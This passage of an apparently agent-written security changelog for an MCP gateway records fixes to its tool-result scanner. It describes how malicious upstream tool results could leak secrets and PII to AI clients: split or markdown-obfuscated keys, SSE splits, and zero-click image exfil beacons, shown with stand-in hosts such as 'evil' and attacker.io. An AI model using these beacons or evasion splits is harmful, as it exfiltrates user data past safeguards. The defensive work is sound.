      result (mirrors the block branch); (B) run the REST tools-list through _scan_tool_result_floor (mask;
      block unmaskable/encoded-exfil → 403 tools_withheld) + audit block/redact (reason=tools_list_metadata_
      scan); clean list not audited. Reuses the floor chain (CHG-0074/0075/0076/0079); actor=None. +3 tests
      (tool-call secret result → masked AND audited redact; REST tools-list secret+IP in description → masked
      + audited redact; benign → no audit). Gate: 3 + 1369 gateway passed, 0 failed; broker -k "not websocket"
      108 passed. Evidence: mcp-parallel/findings/backstop-p9-bare-rest-parity/finding.md.
      CHG-0083 (2026-07-02, HIGH — found by a category×obfuscation regression-matrix pre-flight): several
      CREDENTIALS live in PII_PATTERNS (detect_pii, NOT detect_secrets) — aws_access_key (AKIA/ASIA),
      aws_secret_access_key, api_key_openai, github_token, private_key_header. The CHG-0076 (text-encoding) +
      CHG-0079 (invisible-unicode) encoded-exfil BLOCK only ran detect_secrets/cred/ip, so an OBFUSCATED
      AWS/GitHub/OpenAI key (HTML-entity/zero-width) slipped past the block while its raw form masks (a model
      client reads it deobfuscated). FIX (mcp_scan_orchestrator.py): the encoded _hidden probe now also
      includes decoded detect_pii matches whose compliance tag is SECRET (credentials misfiled as PII);
      generic PII (email/phone/ssn/cc → never SECRET) stays EXCLUDED (scraped-HTML FP guard). SECRET-tag
      filter = principled near-zero-FP boundary. +27 tests (incl. a durable adversarial matrix of 12
      categories raw→masked/blocked + benign→unchanged). Gate: 27 + 1369 gateway passed, 0 failed; broker -k
      "not websocket" 108 passed. Evidence: mcp-parallel/findings/backstop-p2-obfuscated-cred-in-pii/finding.md.
      RESIDUAL: aws_access_key etc. really belong in SECRET_PATTERNS (future cleanup); obfuscated SSN/CC still
      not blocked by the encoded path (raw masks).
      CHG-0084 (2026-07-02, MEDIUM — ARCH item 11 Redis correctness / soak item 16; found by a
      Redis-correctness sweep applying the CHG-0062 lens): leakage_detector.py LeakageDetector.
      track_cross_request tracked cross-request fragment hashes in a Redis SET (leakage:cross:{key}) but did
      per-fragment await sadd then a SEPARATE await expire → a cancellation (client disconnect under load) or
      transient error between them ORPHANED the SET with NO TTL → unbounded Redis growth under soak (same
      class as CHG-0062). FIX (leakage_detector.py): one MULTI/EXEC (pipeline transaction=True) sets members +
      window TTL atomically (also 1 round-trip not N+1); sliding-window preserved; fail-safe unchanged. +3
      tests (one transaction=True pipeline w/ SADD+EXPIRE; key ALWAYS has TTL; no-redis→0.0; benign→no writes).
      Gate: 3 + 1421 gateway passed, 0 failed; broker -k "not websocket" 108 passed. Evidence:
      mcp-parallel/findings/backstop-p11-leakage-detector-ttl-leak/finding.md. RESIDUAL: circuit_breaker.py
      uses transaction=False pipelines for INCR+EXPIRE (batched, small orphan window) — lower priority.
      CHG-0085 (2026-07-02, HIGH — ARCH credential-at-rest, found by a security review of the MCP OAuth
      proxy): mcp_oauth_proxy._write_mcp_remote_tokens persists mcp-remote token files under /tmp/mcp-orgs/
      {org}/mcp-auth/... — access_token + refresh_token, client_secret, PKCE code_verifier — via
      Path.write_text + mkdir(exist_ok=True) with DEFAULT perms (verified on-host: 0664 world-readable files,
      0775 world-traversable dirs). So a co-located process/tenant on the shared gateway host could read
      another org's OAuth creds at rest → upstream-MCP account takeover (Redis copies already encrypted per
      CHG-0042; on-disk copies were not). FIX (mcp_oauth_proxy.py): new _write_secure_text creates files via
      os.open(O_CREAT, 0o600) (restrictive mode at creation, umask-proof) + re-chmod; _write_mcp_remote_tokens
      chmods the org tree (/tmp/mcp-orgs/{org}, mcp-auth, each mcp-remote-{ver}) to 0700. Content unchanged.
      +2 tests (all dirs 0700 + files 0600; os.walk finds ZERO group/world paths; secrets intact). Gate: 2 +
      1449 gateway passed, 0 failed; broker -k "not websocket" 108 passed. Evidence:
      mcp-parallel/findings/backstop-p12-oauth-token-file-perms/finding.md. RESIDUAL: ideally write inside the
      per-tenant sandbox FS (item 12); shred on revocation.
      CHG-0086 (2026-07-02, LOW–MEDIUM — ARCH item 11 Redis correctness; closes the CHG-0084 residual):
      circuit_breaker.py used pipeline(transaction=False) at 4 INCR/DELETE+EXPIRE sites (record_success,
      record_error, _bump_epoch, _admit_probe — the last's docstring even claims "Atomically claim a probe
      slot"). A mid-pipeline connection drop could orphan a counter with NO TTL (same class as CHG-0062/0084).
      FIX (circuit_breaker.py): all 4 → pipeline(transaction=True) (MULTI/EXEC); execute() still returns
      results (24 breaker tests green). Completes the Redis-atomicity trilogy (CHG-0062 rate-limit / CHG-0084
      leakage-detector / CHG-0086 circuit-breaker); grep pipeline(transaction=False) circuit_breaker.py =>
      NONE; no remaining non-atomic TTL-setter found. +1 test. Gate: 1 + 1454 gateway passed, 0 failed;
      broker -k "not websocket" 108 passed. Evidence:
      mcp-parallel/findings/backstop-p11-circuit-breaker-atomicity/finding.md.
      CHG-0087 (2026-07-02, MEDIUM — ARCH item 13 Phase-3 monitoring/metrics): the gateway HAS a Prometheus
      layer (metrics.py, /metrics, counters for requests/policy-blocks/rate-limit/kill-switch/stream/chat) but
      there was NO MCP metric and mcp_proxy.py imported/called `metrics` NOWHERE. Every MCP scan decision
      (block/redact/allow/monitor) was AUDITED (MCPEvent via _record_gateway_event) but never METERED, so the
      1.4 guardrails (block/redact rates + compliance-tag distribution) were invisible to dashboards/alerting.
      FIX (metrics.py + mcp_proxy.py): two low-cardinality counters amf_gateway_mcp_scan_decisions_total
      {org,decision} + amf_gateway_mcp_compliance_tags_total{org,tag} + record_mcp_scan_decision() (fail-safe
      no-op without prometheus_client, _safe_label-bounded), wired into _record_gateway_event (best-effort
      try/except so metrics NEVER break the request path). Every audited MCP decision now metered + rendered
      in /metrics. +4 tests. Gate: 4 + 1455 gateway passed, 0 failed; broker -k "not websocket" 108 passed.
      Evidence: mcp-parallel/findings/backstop-p13-mcp-scan-metrics/finding.md. RESIDUAL: MCP latency
      histogram + OTel tracing are future item-13 pieces.
      CHG-0088 (2026-07-02, LOW–MEDIUM — ARCH item 13/20 monitoring; completes the CHG-0087 residual):
      CHG-0087 added MCP scan-decision + tag COUNTERS but no latency metric, though _record_gateway_event
      already carries latency_ms — so MCP p50/p95/p99 (what "1.4 under peak load" needs) weren't exposed to
      Prometheus. FIX (metrics.py + mcp_proxy.py): new amf_gateway_mcp_call_seconds{org,decision} Histogram
      (5ms…10s); record_mcp_scan_decision gains latency_ms and observes latency_ms/1000 ONLY when truthy
      (0/None skipped so untimed paths don't skew the low bucket); wired via _record_gateway_event (still
      fail-safe). +2 tests. Gate: 6 + 1461 gateway passed, 0 failed; broker -k "not websocket" 108 passed.
      Evidence: mcp-parallel/findings/backstop-p13-mcp-latency-histogram/finding.md. RESIDUAL: OTel tracing
      for the per-call chain remains a separate item-13 piece.
      CHG-0089 (2026-07-02, MEDIUM — ARCH item 13/20 monitoring): metrics.record_rate_limit is called ONLY
      from the chat handler (main.py, per-MODEL limiter). The per-ORG TPM/burst/RPM limiter
      (_enforce_org_tpm_rate_limit/_enforce_org_burst_rpm) doesn't meter internally, and the MCP path
      (_mcp_org_rate_limit_raw) returned a plain 429 with NO metric — so MCP throttling under load (5k–10k
      concurrent calls) was invisible to Prometheus. FIX (mcp_proxy.py): _mcp_org_rate_limit_raw, on a 429
      (TPM or burst/RPM), calls record_mcp_scan_decision(org, "rate_limited") → lands in
      amf_gateway_mcp_scan_decisions_total; preserves the TPM→burst short-circuit + allow path; fail-safe. +4
      tests. Gate: 4 + 14 rate-limit + 1501 gateway passed, 0 failed; broker -k "not websocket" 108 passed.
      Evidence: mcp-parallel/findings/backstop-p13-mcp-ratelimit-metric/finding.md. RESIDUAL: metering
      _enforce_org_tpm_rate_limit internally (chat + MCP) would be cleaner.
      CHG-0090 (2026-07-02, 1.4 / item-20 concurrency dimension — verification + regression-lock, ZERO
      defects): the 300–500-sandbox stress SCALE is host-blocked, but the 1.4 guardrails' concurrency-SAFETY
      is provable here — the scan/redact chain (_scan_tool_result_floor → orchestrator → redact_all) runs
      against MODULE-LEVEL state (compiled-pattern LRU, enabled-tools/server-config caches); a race could
      cross-contaminate concurrent scans (one request's secret leaking into another's result). NEW TEST
      (test_mcp_scan_concurrency_safety.py): 300 concurrent scans each w/ a UNIQUE canary secret+PII+IP across
      10 orgs → 0 own-canary leaks + 0 cross-contamination; + 100 benign concurrent unchanged. Durable
      regression backstop against a future edit adding shared mutable state to the hot scan path. Gate: 2 +
      1527 gateway passed, 0 failed; broker -k "not websocket" 108 passed. Evidence:
      mcp-parallel/findings/backstop-p20-1.4-concurrency-safety/finding.md. HONESTY: proves concurrency-
      safety, NOT the full 300–500-sandbox live stress (host-blocked, owned by CP47-50).
      CHG-0091 (2026-07-03, HIGH fail-open 1.4 leak — MCP adapter stdio/ws ERROR-envelope tool result):
      org_mcp_jsonrpc's adapter tools/call output scan uses `_scan_target = payload.get("result") if "result"
      in payload else payload` — so a BARE JSON-RPC ERROR envelope ({"jsonrpc","id","error":{…}}, NO "result"
      key, the standard MCP tool-FAILURE response) is scanned whole and a secret/PII/internal-IP in
      error.message IS detected + tagged, BUT all 3 output swap branches were gated on `"result" in payload`
      → redaction computed then DISCARDED, raw error egressed. Default "tag" posture = FLOOR is the operative
      masker, and its gate was the one excluding error envelopes. This is the residual CHG-0061 left open (its
      "ORG path unaffected — same floor" claim missed that the org floor gated on "result"). FIX (mcp_proxy.py):
      dropped `"result" in payload` from the floor condition; both redact-swap branches write back to the WHOLE
      envelope when no "result" key (payload = _scanned_out/_scanned_floor), + keep audited reason in sync with
      masked message. Now MASKED, or fail-CLOSED [BLOCKED] on an unmaskable survivor. NEW TEST
      test_mcp_adapter_error_envelope_redaction.py (5). Gate: 5 + 1534 gateway passed 0 failed; broker 108.
      Byte-truth: fixed egress [CONNECTION_STRING_REDACTED], flag-off egress still ghp_…@10.0.0.5. Independent
      oracle (aidefence): email/SSN error envelope → has_pii false fixed / true raw. Evidence:
      mcp-parallel/findings/backstop-p-adapter-error-envelope/finding.md. RESIDUAL: tools/LIST adapter
      fall-through (~L2943 raw return on non-tools-shaped payload) same class, lower probability — noted.
      -> CLOSED by CHG-0092.
      CHG-0092 (2026-07-03, MEDIUM fail-open 1.4 leak — the CHG-0091 TWIN, closes the class): MCP adapter
      tools/LIST fall-through in org_mcp_jsonrpc (the `return adapter_resp` after the tools-shaped branch).
      Upstream tool descriptions scanned only for tools-shaped payloads (_scanned_tools_list_response, CHG-
      0077/0081); any NON-tools-shaped payload — a bare JSON-RPC error envelope (auth-failure tools/list errors
      can echo a token/URL/PII), or a malformed result — returned RAW unscanned. FIX: before the fall-through,
      scan the whole payload via _scan_tool_result_floor (same floor as CHG-0091), mirroring the
      _scanned_tools_list_response contract — masked->redacted envelope, unmaskable->fail-CLOSED withheld,
      clean->raw passthrough; audit block/redact (reason="tools_list_error_scan"). +3 tools/list tests. Gate:
      8 + 1538 gateway passed 0 failed; broker 108. Byte-truth: tools/list error egress b***@c***.example /
      ***-**-4321 (raw bob.jones@corp.example / 987-65-4321); AWS-key+IP variant both masked. Independent
      oracle (aidefence): has_pii false fixed / true raw. Evidence mcp-parallel/findings/backstop-p-toolslist-
      error-envelope/finding.md. NOTE: a ghp_… looked unmasked → test-token defect (pattern \bghp_[a-zA-Z0-9]
      {36}\b exactly 36; valid 36-char github token IS masked via detect_pii→floor), not a code gap.
      CHG-0093 (2026-07-03, HIGH fail-open 1.4 leak — SSE multi-line data: split evades the MCP tool-result
      scanner): _scan_reframe_sse_tool_result (mcp_proxy.py) walked the buffered SSE line-by-line and parsed
      EACH data: line as standalone JSON. Per the SSE spec an event's data is the concat of ALL its data:
      values joined by "\n", so an untrusted upstream can split a JSON-RPC result across data: lines at a
      STRUCTURAL point (JSON whitespace between tokens) — each fragment invalid JSON alone (fell through to
      "not JSON → verbatim"), yet a spec-compliant client reassembles them into the COMPLETE valid result →
      secret egressed raw. FIX: parse the SSE PER EVENT, reassemble each event's data: values with "\n" BEFORE
      json-parse + scan via _scan_tool_result_floor; redact → non-data lines verbatim + one masked data: line;
      unmaskable → fail-CLOSED withhold; clean/keep-alive/non-JSON → verbatim. Covers result+error frames. NEW
      TEST test_mcp_sse_multiline_split.py (7). Gate: 7 + 1540 gateway passed 0 failed; broker 108. Byte-truth
      (client-reassembled): fixed c***@c***.example / ***-**-7788 (raw carol.roe@corp.example / 555-66-7788);
      AKIAIOSFODNN7EXAMPLE+IP variant masked. Independent oracle (aidefence): has_pii false fixed / true raw.
      Evidence mcp-parallel/findings/backstop-p-sse-multiline-split/finding.md. Note: E14 streaming-split tests
      cover the CHAT SecureStreamingResponse guard — a DIFFERENT mechanism; this MCP SSE reframer gap was
      uncovered.
      CHG-0094 (2026-07-03, MEDIUM audit-completeness gap — MCP audit backpressure dropped SECURITY audits
      under load): _spawn_audit_event (mcp_proxy.py) sheds audit POSTs at inflight >= _AUDIT_MAX_INFLIGHT(64)
      but INDISCRIMINATELY — under 5k–10k concurrent calls + slow control the slots fill and block/redact/
      rate_limited/error audits drop too; an attack producing many blocks drops the very block audits it made,
      breaking the …→tag→AUDIT chain silently (only LOG.warning, no metric). FIX: priority-aware shedding —
      security decisions get a higher ceiling (_AUDIT_MAX_INFLIGHT_HIGH=256, env-overridable) so allow/monitor/
      clean shed first and security audits survive; shared counter bounds total inflight to 256. + metric
      amf_gateway_mcp_audit_dropped_total{priority,decision} (record_mcp_audit_dropped) — non-zero priority=high
      = lost security audit, alertable. _spawn_audit_event reads payload["decision"] (no caller change). NEW
      TEST test_mcp_audit_backpressure_priority.py (5). Gate: 5 + 1552 gateway passed 0 failed; broker 108.
      Evidence mcp-parallel/findings/backstop-p-audit-backpressure-priority/finding.md. (Observability fix — no
      content leak, so no aidefence oracle; proof is the shed-decision + drop-metric behavior test.)
      CHG-0095 (2026-07-03, MEDIUM audit-completeness gap — ext-proxy infra-error WITHHOLD/redact not audited):
      ext_mcp_proxy (mcp_proxy.py) audits SSRF/credential/PII blocks (CHG-0068/0070) but the fail-closed infra
      paths recorded nothing → invisible in the MCPEvent trail: response-too-large withhold (SSE+non-SSE,
      CHG-0064), non-JSON body withhold+redact, JSON-RPC error-content withhold+redact, non-200 body withhold+
      redact (CHG-0061), request-too-large DoS reject. This CLOSES the residual at item-9 lines ~760-769 ("infra-
      error withholds not yet audited"). FIX: _ext_audit(...) at every silent site (fire-and-forget, no-op unauth)
      with stable reasons (response_too_large / text_body_withheld+redacted / error_content_withheld+redacted /
      nonok_body_withheld+redacted / request_too_large), carrying tool+tags+findings; purely additive. NEW TEST
      test_mcp_ext_withhold_audit.py (5). Gate: 5 + 1558 gateway passed 0 failed; broker 108. Evidence
      mcp-parallel/findings/backstop-p-ext-withhold-audit/finding.md. RESIDUAL: domain-not-allowlisted 403
      (before _ext_audit def, static input reject) left unaudited by design.
      CHG-0096 (2026-07-03, HIGH zero-click exfil — MCP tool RESULTS not defanged for auto-render EXFIL
      BEACONS): the chat guard defangs markdown-image ![x](https://evil/?d=<data>) / bare beacon URLs via
      neutralize_exfil_channels, but the MCP result scan (orchestrator _scan_text_tier1) only ran redact_all —
      masking recognized PII/secrets but NOT the beacon STRUCTURE. A malicious upstream result with
      ![x](https://evil/?d=<b64-of-conversation>) (opaque payload the regexes miss) egressed as a live
      auto-render beacon a markdown client AUTO-FETCHES on render → zero-click exfil; BYPASSES the chat output
      guard (separate API surface). FIX: (1) _scan_text_tier1 runs neutralize_exfil_channels on RAW text
      (before redact_all so the payload is visible to _url_smuggles_data), adds 'exfil' finding, sets mutation
      to redact_all(neutralized) or neutralized; gated enforcement != monitor. (2) tier1 applies mutation only
      under redact, so added _findings_have_exfil + OR'd into the E12 floor trigger at all 3 sites (CHG-0074
      pattern) so defang fires under default 'tag'. NEW TEST test_mcp_result_exfil_beacon_defang.py (10). Gate:
      10 + 1568 gateway passed 0 failed; broker 108. Byte-level: ![a](.../?leak=john.doe@corp.example) ->
      [a](https://attacker.io/[exfil-redacted]); 5 benign unchanged. ORACLE NOTE: aidefence blind (rated raw
      ?leak=<email> beacon hasPII=false — no PII-in-URL-query parsing); byte-level + behavior authoritative.
      Evidence mcp-parallel/findings/backstop-p-result-exfil-beacon/finding.md. RESIDUAL: HTML <img>/srcset
      nested in a JSON result field NOT defanged (whole-payload JSON scan escapes attribute quotes; HTML
      regexes miss them) — markdown/bare-URL ARE defanged; per-field neutralization is a future item.
      -> CLOSED by CHG-0097.
      CHG-0097 (2026-07-03, HIGH zero-click exfil — CLOSES the CHG-0096 residual): HTML/SVG/CSS/srcset exfil
      beacons NESTED in a JSON tool-result field. The MCP tier-1 target (target_mode=entire) is the whole
      payload JSON-serialized, so HTML attr quotes are escaped (src=\"...\") and neutralize_exfil_channels's
      HTML regexes (expecting real quotes) miss them; markdown (no quotes) survived and defanged, HTML did not.
      FIX: _neutralize_exfil_deep(text) (mcp_scan_orchestrator.py) — if the target is JSON, parse it, neutralize
      each UNESCAPED string LEAF, re-serialize (HTML/srcset/CSS/SVG defang correctly, valid JSON escaping kept);
      non-JSON neutralized directly; returns original unchanged when nothing defanged (benign byte-identical).
      _scan_text_tier1 calls it instead of neutralize_exfil_channels (CHG-0096 finding+floor wiring unchanged).
      +8 tests. Gate: 18 + 1576 gateway passed 0 failed; broker 108. Byte-level: <img src="https://evil/?d=<b64>">
      -> <img src=\"[exfil-redacted]\">; benign cdn img unchanged. Evidence mcp-parallel/findings/backstop-p-
      result-exfil-html-nested/finding.md. The MCP result path now defangs markdown/bare-URL/protocol-relative/
      HTML-media/srcset/CSS-url/SVG-href zero-click beacons (chat-guard parity).
      CHG-0098 (2026-07-03, HIGH fail-open 1.4 leak — ext-proxy NON-FINITE SSE stream egressed UNSCANNED):
      ext_mcp_proxy buffers+scans SSE only for finite methods; a non-finite stream (notifications/*, subscribe,
      long-lived) was forwarded RAW (stream_gen yielded aiter_bytes verbatim, only a LOG.warning) because
      buffering an open stream could hang/OOM — but an untrusted upstream can push sensitive data in a
      notifications/message params -> real unbounded egress leak (the last unscanned MCP egress). FIX: scan PER
      EVENT with bounded memory. _scan_reframe_sse_tool_result gained scan_notifications (notification frame ->
      whole message scanned via floor, reusing CHG-0093 reassembly). Non-finite branch buffers only up to ONE
      event (cap _MCP_SSE_EVENT_MAX_BYTES=1MB env), scans+re-emits; over-cap unterminated event WITHHELD
      fail-closed; blocked event withheld via SSE comment, stream continues. Audited (sse_stream_scanned /
      sse_stream_event_withheld / _too_large). NEW TEST test_mcp_ext_sse_stream_scan.py (5); updated
      test_mcp_bare_proxy_scan.py obsolete passthrough test (another session's) to the scanned behavior. Gate:
      5 + 1581 gateway passed 0 failed; broker 108. Byte-level: notification secret+PII+IP -> AKIA****MPLE /
      b***@c***.example; benign progress unchanged. Independent oracle (aidefence): has_pii false masked / true
      raw. Evidence mcp-parallel/findings/backstop-p-ext-sse-stream-scan/finding.md. Cross-EVENT splits don't
      reassemble client-side, so per-event scanning suffices.
      CHG-0099 (2026-07-03, HIGH fail-open 1.4 leak — markdown-split / encoded PII-secret in MCP tool results
      evaded the scanner): the chat output guard applies THREE render-leak neutralizers (neutralize_exfil_
      channels -> neutralize_encoded_pii -> neutralize_markdown_split_pii G44); CHG-0096 wired only the FIRST
      into the MCP result path. So a PII/secret with chars interleaved by inline markdown emphasis/code/HTML
      (1**2**3-45-6789, AKIA**IOSFODNN7**EXAMPLE, 4111**-1111-1111-**1111, 1&#50;3-45-6789) evaded the raw
      regexes (tags=[]) yet a markdown client STRIPS the emphasis on render and reconstructs the value -> real
      leak. FIX: _neutralize_render_leaks(text) composes all 3 (same order as sanitize_output_for_verdict);
      _neutralize_exfil_deep (CHG-0097 JSON-leaf walker) calls it per leaf, so exfil beacons AND markdown-split/
      encoded PII nested in a JSON field are neutralized. Masked run -> [PII_REDACTED]; finding drives the E12
      floor under default 'tag'. Strict no-op on benign markdown. +9 tests. Gate: 27 + 1594 gateway passed 0
      failed; broker 108. Byte-level: "The SSN is 1**2**3-45-6789 exactly" -> "The SSN is [PII_REDACTED]
      exactly". Independent oracle (aidefence on RENDERED view): has_pii true rendered-raw / false
      rendered-fixed. Evidence mcp-parallel/findings/backstop-p-result-markdown-split-pii/finding.md. MCP result
      egress now has FULL chat-guard render-leak parity. RESIDUAL: secret SPLIT ACROSS content-array items
      (client-concat-dependent) — future item. NOTE (verification-only): leakage_detector.track_cross_request
      is DEAD CODE (defined+tested+made-atomic in CHG-0084 but never wired into any request flow); it's a crude
      per-key fragment heuristic that would FP on legit list-returning tools — inactivity is defensible.
      -> content-array-split residual CLOSED by CHG-0100.
      CHG-0100 (2026-07-03, MEDIUM-HIGH fail-open 1.4 leak, client-concat-dependent — secret SPLIT ACROSS
      content-array items evaded the tool-result scan): a malicious upstream splits a secret so each half is a
      benign sub-pattern in adjacent content blocks (…AKIAIOSFOD / NN7EXAMPLE…); the whole-payload scan sees the
      halves separated by JSON structure so the value is never contiguous (tags=[]), yet a client that
      CONCATENATES the text blocks reconstructs it. FIX (mcp_proxy.py): _scan_tool_result_floor runs a
      cross-block check (unless per-tool monitor wins) — _result_has_split_secret concatenates all content-block
      text + scans for HIGH-CONFIDENCE secrets/credentials (detect_secrets + detect_credential_exposure +
      SECRET-tagged detect_pii); a kind in the concatenation but NOT wholly inside any single block was
      reconstructed only by the join -> fail CLOSED (block). Scoped to secrets/credentials (not generic PII) ->
      negligible FP; contiguous secret in one block left to the normal floor (no over-block). +8 tests. Gate:
      8 + 1602 gateway passed 0 failed; broker 108. BLOCK decision (aidefence-as-oracle N/A). Evidence
      mcp-parallel/findings/backstop-p-result-cross-block-split/finding.md. Completes the split-evasion family
      (SSE CHG-0093, markdown CHG-0099, content-array CHG-0100).
      CHG-0101 (2026-07-03, item-20 concurrency dimension — verification + regression-lock, ZERO defects):
      CHG-0090 proved the plaintext-redaction chain concurrency-safe but predates the render-leak neutralization
      (CHG-0096/0097/0099 exfil beacons + markdown-split/encoded PII) and the cross-block split-block (CHG-0100),
      which run in the HOT scan path. NEW TESTS (test_mcp_scan_concurrency_safety.py, +2): 300 concurrent
      _scan_tool_result_floor across 10 orgs — (1) each w/ UNIQUE benign token + UNIQUE base64 exfil beacon +
      markdown-split secret -> token survives, beacon defanged, markdown-split not reconstructed, 0
      cross-contamination; (2) each w/ valid AWS key split across 2 content blocks -> ALL 300 blocked. RESULT:
      0/0/0/0 + 300/300 blocked -> CHG-0096-0100 guardrails stateless/isolation-safe under concurrency. Gate:
      4 (2+2) + 1604 gateway passed 0 failed; broker 108. Evidence mcp-parallel/findings/backstop-p20-render-
      leak-concurrency/finding.md. HONESTY: proves concurrency-safety, NOT the full 300-500-sandbox live stress
      (host-blocked, owned by CP47-50).
      CHG-0102 (2026-07-03, MEDIUM DoS-amplification SELF-CORRECTION — item 16 resource-bombs): a resource-bomb
      probe found the scan fails CLOSED on a JSON bomb (deeply-nested 6000 -> SCAN_ERROR block) but my CHG-0100
      split-check added ~3s (33%) to a 5MB multi-block result (concatenated ALL block text + 3 detect passes over
      O(total_text)). FIX (mcp_proxy.py): a secret is short so a cross-block split only spans a boundary within
      _MCP_SPLIT_SECRET_SPAN (default 512, env); _boundary_concat trims each block to boundary regions (block
      <=2*span whole; longer keeps first-span + \n\x00\n sentinel + last-span, interior dropped — full-text scan
      covers contiguous); _result_has_split_secret scans that -> O(num_blocks*span). +1 test. Perf: 5MB
      multiblock split-check 3.03s -> 0.378s (~8x). Correctness unchanged (2-way/3-way/huge-left splits caught;
      contiguous-in-long-interior not falsely flagged; benign passes). Gate: 9 + 1605 gateway passed 0 failed;
      broker 108. Evidence mcp-parallel/findings/backstop-p16-split-check-dos-bound/finding.md. RESIDUAL: a
      >512-char secret split into a long block's trimmed interior could be missed (extreme; span env-tunable;
      full-text scan catches contiguous). NOTE: resource-bomb probe also confirmed deeply-nested JSON ->
      fail-closed SCAN_ERROR block (RecursionError caught), 100k-asterisk markdown -> 0.30s (ReDoS-safe),
      50k content blocks -> 2.69s. Pre-existing ~10s detect on a 9MB single block = separate product decision.
      CHG-0103 (2026-07-03, HIGH availability/DoS — MCP Tier-1 scan BLOCKED the event loop under load):
      _scan_text_tier1 (mcp_scan_orchestrator.py) was async but its body is PURE SYNC CPU (detect_pii/secrets/
      ip/cred loops of re.search + redact_all + encoded-exfil loop + render-leak neutralizers), NO await -> ran
      INLINE on the loop. A large tool result (up to 10MB) is seconds of CPU (detect_pii ~2.6s on 8MB; whole
      tier1 ~5-10s) -> BLOCKS the loop, freezing EVERY concurrent request on the worker. Measured: 8MB scan
      stalled a trivial sleep(0.05) coroutine 9.67s (definitive: raced big_scan vs quick() via gather — quick
      completed at t=9.67s = loop blocked). An untrusted upstream triggers it with one crafted result. FIX:
      split into pure-CPU sync _scan_text_tier1_sync (unchanged body) + async wrapper _scan_text_tier1 (same
      signature) that offloads to a thread via asyncio.to_thread when text > _TIER1_OFFLOAD_THRESHOLD (64KB,
      env MCP_TIER1_OFFLOAD_BYTES); small inputs inline (avoid thread-pool pressure). re loop releases the GIL
      between patterns -> loop responsive (empirically: run_in_executor offload dropped quick() from 9.67s to
      0.16s). After fix: 8MB scan stalls only ~0.2s; secret still masked. +4 deterministic tests (patch
      to_thread). Gate: 4 + 1609 gateway passed 0 failed; broker 108. Pre-existing gap (chat scanner.py already
      offloads via run_in_executor lines 962/973; MCP tier1 did not). Evidence mcp-parallel/findings/backstop-
      p16-tier1-event-loop-block/finding.md. RESIDUAL: total CPU of a 9MB scan (~10s) unchanged — no longer
      blocks the loop; capping/reducing is a separate product-level trade-off.
      CHG-0104 (2026-07-03, MEDIUM resource-bomb — item 16 content-block-count limit missing): the 10MB byte
      cap does NOT stop a many-tiny-block bomb (~50k blocks x ~200B = ~3-10MB UNDER the byte cap) that
      amplifies per-block loop cost (JSON serialize, scan-target extraction, tool filtering) and stalled the
      loop ~0.8s (the residual after CHG-0103). Investigation: a heartbeat probe showed the 0.8s stall was NOT
      the detect scan (offloaded by CHG-0103) nor the cross-block split-check — a WARM A/B (disable/enable the
      split-check offload) showed 0.80s inline vs 0.84s offloaded = NO benefit (the 4.81s isolation number was
      cold-start pattern compilation) — so I REVERTED an attempted split-check offload and landed on the
      block-count cap, which addresses the actual cost (many-object JSON/loop overhead) at O(1). FIX
      (mcp_proxy.py): _scan_tool_result_floor fails CLOSED when a result has > _MCP_MAX_CONTENT_BLOCKS (default
      10000, env MCP_MAX_CONTENT_BLOCKS) blocks — O(1) len() check BEFORE the expensive scan. monitor
      observe-only; handles {"content":[…]} + bare list. +7 tests. Behavior: 50k-block bomb -> blocked
      dt=0.000s, loop gap 0.000s (was ~0.8s). Gate: 7 + 1620 gateway passed 0 failed; broker 108. Evidence
      mcp-parallel/findings/backstop-p16-content-block-count-cap/finding.md. No content leak -> no aidefence
      oracle. RESIDUAL: a single ~9MB block still costs ~10s CPU (off the loop via CHG-0103).
      CHG-0105 (2026-07-03, HIGH fail-open 1.4 leak — internal chat->MCP route returned stdio/websocket tool
      RESULTS UNSCANNED): internal_tools_call (the X-Gateway-Internal-Key route the CHAT pipeline uses to run an
      MCP tool for a user) scans the RESULT only on the streamable-http path (_scan_internal_result); on the
      SANDBOX transports (stdio/websocket, _is_sandbox_routed) it returned `return await _adapter_forward(...)`
      DIRECTLY -> the raw result egressed to the chat pipeline -> LLM UNREDACTED (secret/PII/IP/exfil-beacon/
      markdown-split), while the same tool via org_mcp_jsonrpc IS scanned. Confirmed empirically: AKIAIOSFODNN7
      EXAMPLE + bob@corp.example + ![x](https://evil…) all egressed raw. FIX (mcp_proxy.py): the sandbox branch
      buffers the adapter response + (error-envelope aware, CHG-0091) scans the whole result OR a bare error
      envelope via _scan_tool_result_floor (all hardened machinery); swaps masked result, fails CLOSED on
      unmaskable survivor, audits block/redact (transport=internal_sandbox). NEW TEST
      test_mcp_internal_sandbox_result_scan.py (5). Gate: 5 + 1625 gateway passed 0 failed; broker 108.
      Byte-level: alice.jones@corp.example/123-45-6789 -> a***@c***.example/***-**-6789. Independent oracle
      (aidefence): has_pii false fixed / true raw. Evidence mcp-parallel/findings/backstop-p-internal-sandbox-
      result-unscanned/finding.md. RESIDUAL: the internal streamable-http _scan_internal_result scans only
      result.content (not a bare error frame / structuredContent) — narrower than the sandbox complete-skip;
      follow-up to bring the HTTP path to the same error-envelope-aware whole-result scan. -> CLOSED by CHG-0106.
      CHG-0106 (2026-07-03, MEDIUM fail-open 1.4 leak, legacy fallback — CLOSES the CHG-0105 residual):
      _scan_internal_result, the outbound result scanner on internal_tools_call's LEGACY direct-httpx path
      (reached ONLY when MCP_HTTP_VIA_SANDBOX=0; the DEFAULT routes ALL transports through the per-org sandbox =
      CHG-0105), scanned only result_obj.get('content'). If result.content was None it returned the reply
      UNSCANNED -> a secret/PII/internal-IP in an upstream JSON-RPC error frame (error.message) or a
      structuredContent-only result egressed RAW to the chat pipeline -> LLM. It also silently swapped masked
      content with NO audit on the redact. Byte-verified pre-fix (legacy path): error frame AKIAIOSFODNN7EXAMPLE +
      10.1.2.3 + bob.jones@corp.example egressed all three raw; structuredContent-only AWS key + SSN egressed both.
      FIX (mcp_proxy.py): error-envelope aware WHOLE-result scan (mirrors sandbox CHG-0105 + org CHG-0091) —
      scan_target = resp['result'] if 'result' in resp else resp; via _scan_tool_result_floor (content AND
      structuredContent AND bare string/list AND bare error envelope all covered); masks/blocks + AUDITS the redact
      (decision=redact, transport=internal), closing the audit omission. NEW TEST test_mcp_internal_http_result_
      scan.py (5: error-frame secret+IP+PII masked; structuredContent-only masked + redact audited; content
      control masked; redact audited; benign preserved). Gate: 5 + 1649 gateway passed 0 failed; broker 108.
      Byte-level (MCP_HTTP_VIA_SANDBOX=0): error frame -> key=AKIA****MPLE host [INTERNAL_IPV4_REDACTED] user
      b***@c***.example; structuredContent -> "secret":"***","ssn":"***-**-6789". Independent oracle (aidefence):
